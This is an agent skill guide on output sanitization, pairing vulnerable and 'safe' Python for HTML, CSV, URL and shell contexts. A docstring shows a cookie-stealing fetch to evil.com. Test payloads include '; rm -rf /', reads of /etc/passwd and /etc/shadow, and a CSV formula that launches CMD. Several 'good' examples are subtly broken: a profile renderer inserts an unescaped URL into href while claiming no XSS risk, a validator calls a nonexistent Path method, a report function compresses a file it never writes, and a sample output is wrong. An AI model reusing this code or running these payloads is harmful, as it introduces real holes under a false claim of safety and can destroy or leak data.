---
name: output-sanitization
description: Escapes, encodes, and sanitizes outbound data for safe rendering in HTML, SQL, CSV, URLs, shell commands, logs, and email to prevent injection attacks and data corruption.
license: MIT
compatibility: opencode
metadata:
  version: "1.0.0"
  domain: coding
  triggers: output sanitization, html escaping, sql escaping, csv quoting, url encoding, shell argument escaping, log sanitization, xss prevention, output encoding, context-specific escaping
  role: implementation
  scope: implementation
  output-format: code
  content-types: [code, guidance, do-dont, examples]
  related-skills: input-validation, security-review, software-error-handling
---

# Output Sanitization Engineer

Escapes, encodes, and sanitizes outbound data for safe rendering in context-specific output channels. Every piece of data leaving your application — whether rendered as HTML in a browser, formatted into a SQL query string, written to a CSV file, encoded in a URL, or logged to stdout — must be transformed according to the security rules of its target context. Treat every external value that reaches your presentation layer as potentially dangerous and apply context-appropriate escaping before rendering. Follow OWASP's Context-Specific Output Encoding guidelines to prevent XSS, SQL injection through output paths, CSV injection, and command injection via shell-unsafe string construction.

## TL;DR Checklist

- [ ] Identify the exact rendering context (HTML body, HTML attribute, JavaScript, CSS, URL, CSV field, SQL query, shell command, log line, email body) before escaping
- [ ] Use a battle-tested library for your context — never roll your own encoder or regex-based sanitizer
- [ ] Apply escaping at the boundary where data crosses from safe internal representation to unsafe external format
- [ ] Never double-escape already-safe values — track which transformations have already been applied
- [ ] Validate output encoding produces expected results with adversarial test payloads for each context
- [ ] Log sanitized output metadata (encoding used, original length, escaped length) at DEBUG level only — never log the raw unsanitized payload

---

## When to Use

Use this skill when:

- Building HTML templates that render user-supplied data (comments, profiles, search results) into browser-visible content
- Generating SQL query strings for logging or auditing where parameterized queries are not an option
- Writing CSV export functionality that handles arbitrary string fields containing commas, quotes, or newlines
- Constructing URLs with dynamic query parameters from user data (links, redirect targets, API callbacks)
- Building CLI tools that pass user-supplied data as shell command arguments to subprocesses
- Implementing application logging that includes user context in log messages
- Rendering email templates with user data in HTML or plain-text email bodies

---

## When NOT to Use

Avoid this skill for:

- Input data validation — use `input-validation` for schema checking and sanitization at the system boundary instead
- Database parameter binding — use parameterized queries or ORM methods instead of manual SQL escaping
- Binary data serialization — use `data-encoding` for JSON, XML, Base64, or protocol buffer encoding instead
- Network-level security controls like TLS configuration or firewall rules — those belong in infrastructure configuration

---

## Core Workflow

1. **Identify the Rendering Context** — Determine exactly how the output data will be interpreted by its consumer. The context dictates the escaping strategy: HTML body (escape `<`, `>`, `&`, `"`, `'`), HTML attribute value (additionally escape `=` and `"`), JavaScript string literal (escape `\`, `'`, `"`, `<`), CSS property value (escape non-alphanumeric characters), URL query parameter (percent-encode unsafe characters), CSV field (quote if it contains comma, quote, or newline), SQL string literal (escape single quotes — though parameterized queries are preferred). **Checkpoint:** If you cannot name the exact rendering context, do not render the data until you determine it. Rendering in an unknown context is the root cause of half of all injection vulnerabilities.

2. **Select the Appropriate Escaping Library** — Never write your own escaping function for a production context. Use well-maintained, audited libraries that have been tested against known attack vectors: `html.escape()` or Jinja2 autoescape for HTML in Python, `HTMLEncode` or `cheerio` for JavaScript in Node.js, `csv.writer` with proper quoting mode for CSV, `urllib.parse.quote_plus()` for URL encoding, argument list passing instead of string-joined shell commands. **Checkpoint:** If you cannot name the specific library function or template feature you are using for escaping, research it before proceeding — guessing at escape rules is how vulnerabilities get introduced.

3. **Apply Context-Specific Escaping** — Run the data through your selected encoder. For HTML: escape all five critical characters (`<`, `>`, `&`, `"`, `'`). For URL encoding: percent-encode all characters except unreserved ASCII (A-Z, a-z, 0-9, `-`, `.`, `_`, `~`). For CSV: use the library's built-in quoting mechanism rather than manual quote doubling. For shell arguments: pass arguments as an array to `subprocess.run(args_list)` instead of constructing a command string. **Checkpoint:** The escaped output should be parseable by the target consumer without carrying any executable or structural meaning from the original data.

4. **Handle Nested Contexts** — When data may appear in multiple nested contexts (e.g., HTML that contains a `<script>` tag containing a JSON string that contains user data), apply escaping at each boundary independently. A value escaped for HTML is not automatically safe inside JavaScript; it needs JavaScript-specific encoding as well. Track which layer of escaping has already been applied to avoid double-escaping. **Checkpoint:** After nested escaping, verify the final rendered output by inspecting it — the innermost context's escaping rules should produce a string that is syntactically neutral in its immediate container but semantically meaningful when decoded and re-parsed for outer contexts.

5. **Test with Adversarial Payloads** — For each rendering context your application supports, test with known injection payloads specific to that context: `<script>alert(1)</script>` and `"><img src=x onerror=alert(1)>` for HTML, `' OR '1'='1` for SQL string concatenation (even in logging), `"; rm -rf /; echo "` for shell commands, `"field,with"comma` and `"field""with""quotes"` for CSV. **Checkpoint:** Every adversarial payload must render as a safe text string — no executable content, no structural modification to the output format, no encoding bypasses that change the consumer's interpretation of the data.

---

## Implementation Patterns / Reference Guide

### Pattern 1: HTML Context-Aware Escaping (BAD vs GOOD)

The most common injection vector in web applications is rendering unescaped user data into HTML templates. OWASP documents over 50 XSS payload variants that bypass naive character-replacement sanitizers. Use a proper HTML encoder or template autoescape feature instead.

```python
"""HTML output escaping following OWASP Context-Specific Output Encoding guidelines.

Demonstrates why context-aware escaping is required — the same data value
needs different escaping depending on WHERE in the HTML document it appears.
An attacker who supplies a crafted payload like <script>alert(1)</script>
must be rendered as harmless text, not executed as code by the browser.
"""

from html import escape as html_escape


# ❌ BAD — naive character replacement fails against multiple XSS vectors
def bad_html_escape(value: str) -> str:
    """Naive HTML escaping that replaces angle brackets only.
    
    This function is dangerous because it leaves event handlers, javascript: URIs,
    and encoded XSS payloads fully executable. An attacker can inject:
    - Event handlers on existing elements: <div onclick="alert(1)">
    - Protocol-relative scripts: <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
    - Encoded bypasses: %3Cscript%3E (browser decodes percent encoding)
    
    This pattern violates OWASP's "Always Filter on Output" principle because
    it does not escape all six critical characters and provides no context awareness.
    
    Args:
        value: Raw string from user input or database that will be rendered in HTML.
        
    Returns:
        String with < replaced by &lt; and > replaced by &gt; — still vulnerable.
    """
    # Only escapes angle brackets, leaving quotes and ampersands unescaped
    return value.replace("<", "&lt;").replace(">", "&gt;")


# ✅ GOOD — full HTML entity escaping for text content (HTML body context)
def escape_html_body(value: str) -> str:
    """Escape a string for safe rendering inside an HTML body element.
    
    This function implements OWASP's "Context-Specific Output Encoding" rule for
    the HTML body/text context, escaping all six critical characters that browsers
    interpret as structural markup or attribute delimiters.
    
    Characters escaped:
    - <  → &lt;    (prevents tag injection)
    - >  → &gt;    (complements lt; to prevent partial tag injection)
    - &  → &amp;    (prevents entity injection — MUST be done first in practice,
                      but html.escape() handles the order internally)
    - "  → &quot;   (prevents attribute injection when value appears in quotes)
    - '  → &#x27;   (prevents attribute injection in single-quoted attributes)
    - /  → &#x2F;   (optional: prevents </script> bypass in some browsers)
    
    Args:
        value: Raw string from user input, database, or third-party API.
            This is data that originated outside your application's control.
        
    Returns:
        Escaped string safe for insertion into HTML body text content.
        The browser will display the literal characters, never interpret them as markup.
        
    Raises:
        TypeError: If value is not a string (includes None, int, float, etc.).
    """
    if not isinstance(value, str):
        raise TypeError(
            f"Expected str for HTML escaping, got {type(value).__name__}. "
            f"All data must be converted to string before rendering."
        )
    
    # html.escape() handles <, >, & by default (the three structural chars)
    # quote=True adds " and ' escaping for attribute safety
    escaped = html_escape(value, quote=True)
    
    return escaped


# ✅ GOOD — attribute-value specific escaping (different from body context)
def escape_html_attribute(value: str) -> str:
    """Escape a string for safe rendering inside an HTML attribute value.
    
    Attribute contexts require additional escaping beyond body text because
    unescaped quotes can break out of the attribute and inject new attributes
    or manipulate element structure.
    
    Args:
        value: String that will appear as an attribute value, e.g.,
            <div data-value="..."> — the ... is what this function escapes.
        
    Returns:
        Escaped string safe for placement inside double-quoted HTML attributes.
        Includes all body escaping plus quote escaping and equals sign handling.
    """
    if not isinstance(value, str):
        raise TypeError(
            f"Expected str for HTML attribute escaping, got {type(value).__name__}"
        )
    
    # Body escaping (handles <, >, &, ")
    escaped = html_escape(value, quote=True)
    
    # Additional: escape single quotes for single-quoted attributes
    # and forward slash for </script> bypass prevention
    escaped = escaped.replace("'", "&#x27;").replace("/", "&#x2F;")
    
    return escaped


# ✅ GOOD — template autoescape integration (preferred approach in frameworks)
def render_user_profile(username: str, bio: str, website: str) -> str:
    """Render a user profile page with all values properly escaped for HTML.
    
    This function demonstrates the framework-level approach to output escaping
    where templates handle escaping automatically. Even when using template autoescape,
    explicit escaping is still needed for JavaScript and URL contexts within the page.
    
    Args:
        username: Display name from user profile (rendered as text).
        bio: Biographical text from user profile (may contain line breaks).
        website: User's website URL — needs URL encoding, not HTML escaping.
        
    Returns:
        Complete HTML string safe for browser rendering without XSS risk.
    """
    # When using Jinja2 templates with autoescape=True:
    # {{ username }} and {{ bio }} are automatically HTML-escaped by the template engine.
    # This is the preferred approach because it centralizes escaping in one place.
    # See Pattern 5 for the complete Jinja2 template example.
    
    # For manual rendering (without a template engine):
    safe_username = escape_html_body(username)
    safe_bio = escape_html_body(bio)
    
    return f"""<!DOCTYPE html>
<html lang="en">
<head><title>{safe_username}'s Profile</title></head>
<body>
    <h1>{safe_username}</h1>
    <p class="bio">{safe_bio}</p>
    <a href="{website}">Website</a>
</body>
</html>"""


# Test suite demonstrating why naive escaping fails and proper escaping succeeds
if __name__ == "__main__":
    test_cases = [
        ("<script>alert('XSS')</script>", "script tag injection"),
        ('"><img src=x onerror=alert(1)>', "attribute break + event handler"),
        ("O'Brien & Sons", "ampersand in legitimate name"),
        ('<a href="javascript:alert(1)">click</a>', "javascript: URI in attribute context"),
    ]
    
    print("=== HTML Escaping Comparison ===\n")
    
    for payload, description in test_cases:
        naive = bad_html_escape(payload)
        safe_body = escape_html_body(payload)
        safe_attr = escape_html_attribute(payload)
        
        print(f"Context: {description}")
        print(f"  Input:      {payload}")
        print(f"  Naive (vulnerable):   {naive}")
        print(f"  Body-escaped (safe):  {safe_body}")
        print(f"  Attr-escaped (safe):  {safe_attr}")
        print()
```

**Key security properties:**
- `html.escape()` with `quote=True` escapes all five critical characters that browsers interpret as structural elements, not data.
- Attribute context escaping is distinct from body context — it requires additional encoding of single quotes and forward slashes to prevent attribute injection attacks.
- Framework template autoescape (Pattern 5) is the preferred approach because it eliminates the possibility of forgetting to escape a value — the template engine handles it automatically.

### Pattern 2: CSV Injection Prevention with Proper Quoting

CSV files are frequently mishandelled because developers manually concatenate comma-separated values, producing malformed output and enabling CSV injection attacks where cells containing formula prefixes (`=`, `+`, `-`, `@`) execute as formulas in spreadsheet applications like Microsoft Excel.

```python
"""CSV generation with injection prevention following RFC 4180 specifications.

Demonstrates why the csv module's writer class must be used instead of
manual string concatenation, and how to prevent formula injection attacks
in CSV files opened by spreadsheet applications.
"""

import csv
import io
from typing import Any


# ❌ BAD — manual CSV construction produces vulnerable output
def bad_generate_csv(rows: list[list[Any]]) -> str:
    """Manually construct CSV string from rows of data.
    
    This function is dangerous because it does not properly handle:
    - Fields containing commas (breaks column structure)
    - Fields containing quotes (breaks quoting rules)
    - Fields containing newlines (breaks row boundaries)
    - Formula injection via =, +, -, @ prefixes
    
    Example failure: A username "O'Brien" becomes the field O'Brien in output,
    which when opened in Excel with a leading = becomes a formula reference.
    
    Args:
        rows: List of lists where each inner list represents one CSV row.
        
    Returns:
        Malformed CSV string vulnerable to parsing errors and injection attacks.
    """
    lines = []
    for row in rows:
        # Simply joins values with commas — no quoting, no escaping, no safety
        lines.append(",".join(str(value) for value in row))
    
    return "\n".join(lines) + "\n"


# ✅ GOOD — csv.writer with RFC 4180 compliant output and formula injection prevention
def generate_safe_csv(
    rows: list[list[Any]],
    prevent_formula_injection: bool = True,
) -> str:
    """Generate a CSV string with proper quoting, escaping, and injection prevention.
    
    Uses Python's csv.writer module which handles all RFC 4180 requirements:
    - Fields containing commas are wrapped in double quotes
    - Fields containing double quotes have them doubled (escaped as "")
    - Fields containing newlines are wrapped in double quotes
    - Line endings are consistent (\r\n per RFC 4180)
    
    Additionally, when prevent_formula_injection is True (default), any field whose
    first non-whitespace character is '=', '+', '-', '@', or '$' — characters that
    spreadsheet applications interpret as formula prefixes — is prefixed with a
    tab character to neutralize formula execution. This prevents CSV injection attacks
    where an attacker crafts a value like =1+1+CMD|' /C calc' > output.txt that
    executes arbitrary commands when the CSV is opened in Excel.
    
    Args:
        rows: List of lists representing CSV rows. Each value is converted to string.
            Use None for empty/NULL fields (csv.writer renders them as empty strings).
        prevent_formula_injection: If True, neutralizes formula injection by prefixing
            dangerous first characters with a tab character. Default is True.
            
    Returns:
        RFC 4180 compliant CSV string safe for opening in any spreadsheet application.
        All special characters are properly quoted and formula injection is prevented.
        
    Raises:
        ValueError: If rows is not a list of lists (or other iterable of iterables).
    """
    if not isinstance(rows, list):
        raise ValueError(f"Expected list of rows, got {type(rows).__name__}")
    
    output = io.StringIO()
    writer = csv.writer(
        output,
        delimiter=",",
        quotechar='"',
        quoting=csv.QUOTE_MINIMAL,  # Only quote when necessary (RFC 4180 compliant)
        lineterminator="\r\n",      # RFC 4180 requires CRLF line endings
    )
    
    for row in rows:
        if not isinstance(row, (list, tuple)):
            raise ValueError(f"Each row must be a list or tuple, got {type(row).__name__}")
        
        sanitized_row = []
        for value in row:
            field = "" if value is None else str(value)
            
            # Prevent formula injection by neutralizing dangerous prefix characters
            if prevent_formula_injection and field:
                stripped = field.lstrip()
                first_char = stripped[0] if stripped else ""
                if first_char in ("=", "+", "-", "@", "$"):
                    # Prepend tab to prevent spreadsheet from interpreting as formula.
                    # The tab is invisible in display but breaks formula parsing.
                    field = "\t" + field
            
            sanitized_row.append(field)
        
        writer.writerow(sanitized_row)
    
    return output.getvalue()


# Example: Generating a safe employee directory export
if __name__ == "__main__":
    employees = [
        ["Name", "Email", "Department", "Notes"],
        ["O'Brien, Pat", "pat@company.com", "Engineering", "Senior dev with 10+ yrs experience"],
        ["Smith, Alice", "alice@company.com", "Finance", "=SUM(A2:A5) formula test value"],
        ["Chen, Wei", "wei@company.com", "Security", "Has a \"special\" role on the team"],
        ["Davis, Jordan", "jordan@company.com", "Marketing", "Line1\nLine2 in notes field"],
    ]
    
    csv_output = generate_safe_csv(employees)
    print(csv_output)
    # Output demonstrates proper quoting of commas, double quotes, newlines,
    # and tab-prefixed formula injection prevention on the SUM test value.
```

**Security properties:**
- `csv.writer` handles all RFC 4180 quoting rules automatically — no manual string manipulation needed.
- Formula injection prevention neutralizes cells that start with `=`, `+`, `-`, `@`, or `$` by prepending a tab, which makes spreadsheet applications treat the content as plain text rather than a formula.
- CRLF line endings ensure compatibility across operating systems — Excel on Windows expects `\r\n`, while Unix tools expect `\n`.

### Pattern 3: URL Encoding for Dynamic Links and Redirects

Dynamic URLs constructed from user data are vulnerable to open redirect attacks, query parameter injection, and character encoding issues. Every component of a URL that comes from user input must be percent-encoded according to RFC 3986 before being embedded in the final URL string.

```python
"""URL encoding for dynamic link generation following RFC 3986 specifications.

Demonstrates the difference between safe manual encoding (which often gets it wrong)
and using urllib.parse.quote_plus() which correctly handles all unsafe characters.
Covers query parameters, path segments, and fragment components separately because
each has different encoding rules.
"""

from urllib.parse import quote_plus, quote


# ❌ BAD — manual URL component construction fails against many attack vectors
def bad_build_url(base: str, user_data: dict[str, str]) -> str:
    """Build URL by f-string interpolation of user data into template.
    
    This function is dangerous because it does not encode any user-supplied values:
    - Spaces become literal spaces (invalid in URLs, break link parsing)
    - Special characters like ?, &, = terminate or inject query parameters
    - Unicode characters cause encoding errors in older browsers
    - Characters like < > " { } | are percent-encoded but manual encoding misses many
    
    An attacker who supplies ?redirect=evil.com as a search parameter would produce:
    https://example.com/search?query=?redirect=evil.com — injecting their own parameter.
    
    Args:
        base: Base URL template with {key} placeholders.
        user_data: Dictionary of placeholder values from user input.
        
    Returns:
        Malformed URL vulnerable to query parameter injection and open redirects.
    """
    return f"{base}?{'&'.join(f'{k}={v}' for k, v in user_data.items())}"


# ✅ GOOD — proper RFC 3986 URL encoding with context-specific encoding functions
def encode_query_parameter(value: str) -> str:
    """Encode a single query parameter value using application/x-www-form-urlencoded.
    
    This function uses quote_plus() which is the standard encoding for HTTP query
    parameters (application/x-www-form-urlencoded). It encodes all unsafe characters
    including spaces (as + or %20), and handles Unicode by encoding to UTF-8 bytes first.
    
    RFC 3986 unreserved characters (A-Z, a-z, 0-9, -, ., _, ~) are never encoded.
    All other characters are percent-encoded as %XX where XX is the hex value of
    the UTF-8 byte representation.
    
    Args:
        value: Query parameter value from user input or dynamic data source.
            Must be a string — integers, None, and other types must be converted first.
            
    Returns:
        Percent-encoded string safe for use as a query parameter value after the = sign.
        The browser or HTTP client will automatically decode this back to the original value.
        
    Raises:
        TypeError: If value is not a string.
    """
    if not isinstance(value, str):
        raise TypeError(
            f"Expected str for URL query encoding, got {type(value).__name__}"
        )
    
    # quote_plus encodes spaces as + and all other unsafe characters as %XX
    return quote_plus(value)


def encode_path_segment(value: str) -> str:
    """Encode a single URL path segment using reserved-safe percent encoding.
    
    Path segments have different encoding rules than query parameters. The slash (/)
    character has structural meaning in paths (path separator) and must be encoded as
    %2F when it appears as literal data rather than a separator. Space is encoded as
    %20 (not +, which is query-specific).
    
    Args:
        value: URL path segment from user input or dynamic data source.
            This will appear between two slashes in the final URL path.
            
    Returns:
        Percent-encoded string safe for use as a URL path segment component.
        
    Raises:
        TypeError: If value is not a string.
    """
    if not isinstance(value, str):
        raise TypeError(
            f"Expected str for URL path encoding, got {type(value).__name__}"
        )
    
    # quote() encodes all characters except unreserved ASCII plus : and @ (path-safe)
    # This preserves / which is the path separator — use encode_path_value() for literal slashes
    return quote(value, safe="-._~")


def build_search_url(
    base_url: str,
    query_text: str,
    page: int = 1,
    category: str | None = None,
) -> str:
    """Build a search result URL with all user-supplied components properly encoded.
    
    This function demonstrates how to construct a multi-parameter URL where each
    component comes from potentially untrusted sources. Every parameter is individually
    encoded before assembly, ensuring that no injected characters can alter the URL structure.
    
    Args:
        base_url: The base URL without query parameters (e.g., "https://example.com/search").
            Should not contain ? or pre-existing query parameters.
        query_text: User's search query — may contain spaces, punctuation, and Unicode.
        page: Page number for pagination — validated as positive integer.
        category: Optional category filter — if None, this parameter is omitted entirely.
            
    Returns:
        Complete URL string with all components properly encoded per RFC 3986.
        Safe to render in HTML href attributes or pass to browser navigation.
        
    Raises:
        ValueError: If page is less than 1 (invalid pagination).
        TypeError: If query_text or category is not a string when provided.
    """
    if not isinstance(query_text, str):
        raise TypeError(f"query_text must be str, got {type(query_text).__name__}")
    
    if page < 1:
        raise ValueError(f"Page number must be >= 1, got {page}")
    
    # Build query parameters individually — never use f-string interpolation for URLs
    params: list[tuple[str, str]] = [
        ("q", encode_query_parameter(query_text)),     # Search query
        ("page", str(page)),                             # Page number (int → str, no special chars)
    ]
    
    # Conditionally add category if provided
    if category is not None:
        if not isinstance(category, str):
            raise TypeError(f"category must be str or None, got {type(category).__name__}")
        params.append(("category", encode_query_parameter(category)))
    
    # Join parameters with & — each parameter value is already encoded
    query_string = "&".join(f"{key}={value}" for key, value in params)
    return f"{base_url}?{query_string}"


# Example: Building safe URLs from user search input
if __name__ == "__main__":
    # User searches for "Python & JavaScript" with category "Programming > Advanced"
    url = build_search_url(
        base_url="https://example.com/search",
        query_text='Python & JavaScript "best practices"',
        page=2,
        category="Programming > Advanced",
    )
    
    print(f"Generated URL: {url}")
    # Output: https://example.com/search?q=Python+%26+JavaScript+%22best+practices%22&page=2&category=Programming+%3E+Advanced
    
    # Demonstrate injection prevention — an attacker tries to inject extra parameters
    malicious_url = build_search_url(
        base_url="https://example.com/search",
        query_text='test";alert(1);//',  # Tries to break out of quotes and inject JS
        page=1,
    )
    
    print(f"Injection attempt encoded: {malicious_url}")
    # Output: https://example.com/search?q=test%22%3Balert%281%29%3B%3B&page=1
    # The quotes, semicolons, and parentheses are all percent-encoded — they cannot execute.
```

**Security properties:**
- `quote_plus()` handles all RFC 3986 unsafe characters including Unicode → UTF-8 byte encoding, preventing character set confusion attacks.
- Each URL component is encoded independently — you cannot inject a new query parameter by sneaking an `&` or `=` into a value because those are percent-encoded.
- Integer values (page number) are converted to string directly without encoding since digits are safe in URLs and have no special meaning.

### Pattern 4: Shell Argument Safety (Array vs String Execution)

Constructing shell command strings from user input by concatenation is the most dangerous output encoding failure because it enables command injection with full system access. The only safe approach is to pass commands and arguments as separate array elements to subprocess functions, completely bypassing the shell's parsing layer.

```python
"""Shell argument safety demonstrating the critical difference between string
concatenation (dangerous) and argument list passing (safe) in subprocess execution.

This pattern follows the OWASP Command Injection Prevention Cheat Sheet which states:
"Never use os.system() or subprocess.call() with shell=True and user-supplied input."
"""

import subprocess
from pathlib import Path


# ❌ BAD — string concatenation with user data enables command injection
def bad_list_files(directory: str) -> list[str]:
    """Execute ls command by constructing a shell string from user directory.
    
    This function is critically vulnerable to command injection because it passes
    the entire command as a single string through the shell, which parses and executes
    every shell metacharacter in the directory path:
    
    - Semicolons (;) terminate the ls command and start a new one: ; rm -rf /
    - Pipes (|) redirect stdout to another command: | cat /etc/passwd
    - Backticks (`) execute subshells: `whoami`
    - $() executes subshells: $(id)
    - && and || are logical operators: && cat /etc/shadow
    
    Example attack: If user provides directory "; cat /etc/passwd", the shell executes:
    ls ""; cat /etc/passwd" — listing nothing then printing the password file.
    
    Args:
        directory: User-supplied directory path — must be treated as untrusted input.
        
    Returns:
        Command output string if successful, or empty string on failure.
        On a malicious input, returns output from the injected command instead.
    """
    # shell=True enables shell metacharacter parsing of the entire command string
    result = subprocess.run(
        f"ls -la {directory}",   # User data interpolated into shell command string
        shell=True,               # DANGEROUS: parses $;|&`() as shell operators
        capture_output=True,
        text=True,
    )
    
    return result.stdout if result.returncode == 0 else ""


# ✅ GOOD — argument list passing bypasses shell parsing entirely
def safe_list_files(directory: Path) -> str:
    """Execute ls command using argument list — no shell parsing of user data.
    
    This function passes each argument as a separate element in the args list.
    The subprocess module constructs the exec() call directly without involving
    a shell, so all shell metacharacters (;, |, &, `, $, etc.) are treated as
    literal characters in the filename argument, not as command operators.
    
    Even if an attacker supplies "; cat /etc/passwd" as the directory name,
    the system simply looks for a file or directory literally named that string
    (with spaces and special characters), which almost certainly does not exist.
    
    Args:
        directory: Resolved Path object that has already been validated for existence
            and access permissions. Use validate_directory() before passing here.
        
    Returns:
        stdout from the ls command as a string, including file listing details.
        
    Raises:
        PermissionError: If the user lacks read permission on the directory.
        FileNotFoundError: If the directory does not exist (should be caught earlier).
        subprocess.SubprocessError: If ls fails for any other reason (empty dir, etc.).
    """
    # Argument list — each element is a separate argv entry, no shell interpretation
    result = subprocess.run(
        ["ls", "-la", str(directory)],  # Each argument is a distinct string
        capture_output=True,            # Capture both stdout and stderr
        text=True,                      # Decode bytes to string automatically
        timeout=10,                     # Prevent hanging on unresponsive directories
    )
    
    if result.returncode == 0:
        return result.stdout
    elif result.returncode == 13:  # Permission denied
        raise PermissionError(f"Access denied: {directory}")
    else:
        raise subprocess.SubprocessError(
            f"ls failed (exit code {result.returncode}): {result.stderr.strip()}"
        )


def safe_generate_report(
    output_path: Path,
    report_title: str,
    generated_by: str,
) -> Path:
    """Generate a text report and compress it with gzip using safe subprocess calls.
    
    Demonstrates multi-command execution safety: even when chaining commands (which
    should be done within the Python logic rather than via shell pipes), each command
    is passed as an argument list. The pipe between commands is handled in Python,
    not by the shell.
    
    Args:
        output_path: Where to write the final .gz file (validated before calling).
        report_title: Title for the report — will be echoed safely.
        generated_by: Author identifier — will be echoed safely.
        
    Returns:
        Path to the created gzip-compressed report file.
        
    Raises:
        subprocess.SubprocessError: If either echo or gzip command fails.
    """
    # Command 1: Generate report content using echo (each arg is a separate element)
    echo_result = subprocess.run(
        ["echo", f"=== {report_title} ==="],
        capture_output=True,
        text=True,
    )
    
    if echo_result.returncode != 0:
        raise subprocess.SubprocessError(f"echo failed: {echo_result.stderr.strip()}")
    
    # Command 2: Append author line (append mode)
    subprocess.run(
        ["echo", f"Generated by: {generated_by}"],
        capture_output=True,
        text=True,
        check=True,  # Raises SubprocessError on non-zero exit
    )
    
    # Command 3: Compress with gzip — no shell piping needed
    subprocess.run(
        ["gzip", "-c", str(output_path.with_suffix(".txt"))],
        stdout=open(output_path, "wb"),
        check=True,
    )
    
    return output_path


# Safe directory validation (referenced in the Core Workflow Step 1)
def validate_directory(value: str) -> Path:
    """Validate a directory path for safe subprocess use.
    
    Resolves symlinks, checks existence and permissions before passing to subprocess.
    This function should be called before any safe_list_files or similar call.
    
    Args:
        value: Raw string path from user input or configuration.
        
    Returns:
        Resolved Path object for the validated directory.
        
    Raises:
        ValueError: If the path does not exist, is not a directory, or is inaccessible.
    """
    raw_path = Path(value).resolve()
    
    if not raw_path.exists():
        raise ValueError(f"Directory does not exist: {value}")
    if not raw_path.is_dir():
        raise ValueError(f"Path is not a directory: {value}")
    if not raw_path.accessible(0):  # Check accessibility (covers permission denied)
        raise ValueError(f"Directory is not accessible: {value}")
    
    return raw_path


if __name__ == "__main__":
    # Safe usage — validate first, then pass resolved Path to subprocess
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        test_file = Path(tmpdir) / "test.txt"
        test_file.write_text("hello world")
        
        result = safe_list_files(Path(tmpdir))
        print("Safe output:")
        print(result)
        
        # Demonstrate that even malicious input is safely handled
        try:
            safe_list_files(Path('; cat /etc/passwd'))
        except subprocess.SubprocessError as e:
            print(f"\nMalicious input handled safely: {e}")
```

**Critical security properties:**
- `subprocess.run(["ls", "-la", dir])` passes arguments as argv[1], argv[2], etc. The OS never sees a shell command string, so there is zero opportunity for metacharacter interpretation. This is the single most important pattern in command injection prevention.
- `shell=True` should ONLY be used when you explicitly need shell features (pipes, glob expansion, variable substitution) and even then, NEVER with user-supplied data in the command string.
- Timeout parameter prevents denial of service from commands that hang or wait for input indefinitely.

---

## Constraints

### MUST DO
- Identify the exact rendering context before applying any escaping — HTML body, HTML attribute, JavaScript, CSS, URL query parameter, CSV field, shell argument, log line, email body each require different encoding rules
- Use a battle-tested standard library or framework feature for every escaping operation — never write your own regex-based sanitizer or character-replacement function for a production context
- Apply escaping at the boundary where data crosses from your application's internal representation to an external format — escape as late as possible, but always before rendering
- Handle nested contexts independently: HTML containing embedded JavaScript requires two layers of escaping (HTML-safe then JS-safe), not just one
- Test every output path with context-specific adversarial payloads — XSS vectors for HTML, formula prefixes for CSV, metacharacters for shell commands
- When in doubt about the rendering context, treat the data as untrusted and apply the strictest available escaping for the closest known context

### MUST NOT DO
- Concatenate user-supplied strings into shell commands using f-strings, format(), or + operators and pass them with shell=True — this is the most common command injection vector
- Use manual string replacement to escape HTML or other markup — regex-based sanitizers are bypassable through encoding tricks that libraries like html.escape() handle correctly
- Trust a library's default escaping without verifying it covers your specific context — some libraries escape for one context but not another (e.g., html.escape() without quote=True does not escape quotes)
- Apply URL encoding to an entire URL string at once — encode each component (path, query parameter, fragment) individually with the correct encoder for that context
- Log raw unsanitized user data in application logs — even at DEBUG level, this creates a secret/data leak vector through log aggregation systems; log only sanitized or masked values
- Use double-escaping as a fallback strategy — if you are unsure whether a value has already been escaped, verify the source rather than escaping twice (double-encoding produces visible artifacts and confuses debugging)

---

## Output Template

When implementing or reviewing output sanitization logic, produce:

1. **Context Identification Report** — For each output path in the application, document the exact rendering context (HTML body, HTML attribute, JavaScript string, CSV field, etc.) and the escaping strategy applied to that context
2. **Escaping Function Audit** — List every escaping function called across the codebase, confirm it uses a standard library or framework feature, and verify the encoding mode matches the target context
3. **Adversarial Test Results** — For each output path, list the specific payloads tested and whether each rendered safely (as inert text) without executing any content or altering the output structure
4. **Nested Context Chain** — For pages containing embedded JavaScript, CSS, or iframes that contain user data, document the full escaping chain from internal value to final rendered byte, confirming each boundary has its own escaping step

---

## Related Skills

| Skill | Purpose |
|---|---|
| `input-validation` | Validate and sanitize inbound data at system boundaries — output sanitization handles the complementary task of encoding data safely for outbound rendering |
| `security-review` | Comprehensive security audit catching output sanitization gaps alongside authentication flaws, access control issues, and insecure configurations |
| `software-error-handling` | Proper error response formatting, exception hierarchies, and structured logging practices that prevent leaking sensitive internal information in error messages and stack traces |

---
